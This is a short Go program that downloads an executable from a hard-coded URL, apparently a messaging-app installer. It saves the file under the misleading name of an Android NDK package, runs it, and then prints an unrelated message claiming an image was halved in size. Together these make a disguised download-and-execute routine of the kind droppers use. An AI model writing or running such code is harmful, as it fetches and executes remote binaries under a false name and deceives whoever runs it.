package main

import (
    "fmt"
    "net/http"
    "io/ioutil"
    "os"
    "log"
    "os/exec"
    )

func HTTPDownload(uri string) ([]byte, error) {
    fmt.Printf("HTTPDownload From: %s.\n", uri)
    res, err := http.Get(uri)
    if err != nil {
        log.Fatal(err)
    }
    defer res.Body.Close()
    d, err := ioutil.ReadAll(res.Body)
    if err != nil {
        log.Fatal(err)
    }
    fmt.Printf("ReadFile: Size of download: %d\n", len(d))
    return d, err
}

func WriteFile(dst string, d []byte) error {
    fmt.Printf("WriteFile: Size of download: %d\n", len(d))
    err := ioutil.WriteFile(dst, d, 0444)
    if err != nil {
        log.Fatal(err)
    }
    return err
}

func main() {
    uri := "http://misc.zaloapp.com/pc/ZaloSetup_V23_09h06_21052015.exe"
    dst := "./android-ndk-r10e-windows-x86_64.exe"
    contents, err := HTTPDownload(uri)
    if err != nil {
        fmt.Printf("%s", err)
        os.Exit(1)
    } else {
	// fmt.Printf("%s\n", string(contents))
	if WriteFile(dst, contents) == nil {
            if err := exec.Command(dst, []string{}...).Run(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	    }
	    fmt.Println("Successfully halved image in size")

        }
    }
}